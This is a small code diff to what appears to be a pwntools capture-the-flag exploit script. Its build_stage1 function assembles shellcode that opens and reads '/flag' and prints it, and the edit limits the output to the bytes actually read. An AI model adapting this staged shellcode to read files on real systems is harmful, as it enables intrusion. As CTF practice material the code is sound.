@@ -44,7 +44,8 @@ def build_stage1(flag_path: str = "/flag", read_len: int = 0x100, stage0_len: in
     raw = asm(
         shellcraft.open(flag_path, 0)
         + shellcraft.read("rax", "rsp", read_len)
-        + shellcraft.write(1, "rsp", read_len)
+        + "mov rdx, rax;"                # n’afficher que le nombre d’octets réellement lus
+        + shellcraft.write(1, "rsp", "rdx")
     )
     assert len(raw) <= stage0_len, f"Stage 1 ({len(raw)} bytes) longer than Stage 0 read ({stage0_len})."
     return raw.ljust(stage0_len, b"\x90")
